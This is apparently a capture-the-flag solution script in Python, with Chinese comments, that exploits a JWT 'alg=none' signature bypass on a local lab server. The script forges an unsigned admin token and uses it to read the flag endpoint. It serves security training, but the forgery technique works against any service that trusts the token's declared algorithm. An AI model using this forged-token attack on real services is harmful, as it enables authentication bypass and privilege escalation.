#!/usr/bin/env python3
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
Q35 - 逻辑漏洞 · JWT 算法降级 (alg=none)
目标: http://127.0.0.1:34947
原理: 服务端 decode_token 信任 header 自声明的 alg；当 alg=none 时走
      jwt.decode(token, options={'verify_signature': False}) 分支，
      完全跳过签名校验。攻击者可任意伪造 payload。
"""
import base64
import json
import sys
import urllib.request
import urllib.parse

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1

TARGET = os.environ.get("GKD_URL") or ("http://127.0.0.1:35026")


def b64url(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def http(method: str, path: str, data=None, token: str = "") -> dict:
    url = TARGET + path
    body = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(url, data=body, method=method)
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def main() -> int:
    # Step1: 登录拿对照 token（仅用于确认接口与 payload 结构）
    login = http("POST", "/api/login",
                 data={"username": "guest", "password": "guest123"})
    print("[+] login:", login)

    # Step2: 构造 alg=none 伪造 token
    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": "admin", "role": "admin"}
    forged = f"{b64url(header)}.{b64url(payload)}."   # 末尾点必须保留
    print("[+] forged token:", forged)

    # Step3: 用 /api/me 自检 payload 是否被接受
    me = http("GET", "/api/me", token=forged)
    print("[+] /api/me:", me)
    assert me.get("payload", {}).get("role") == "admin", "alg=none 未生效"

    # Step4: 拿 flag
    res = http("GET", "/api/flag", token=forged)
    print("[+] /api/flag:", res)
    flag = res.get("flag")
    if flag:
        print(f"\n[FLAG] {flag}")
        return 0
    print("[-] 未拿到 flag")
    return 1


if __name__ == "__main__":
    sys.exit(main())
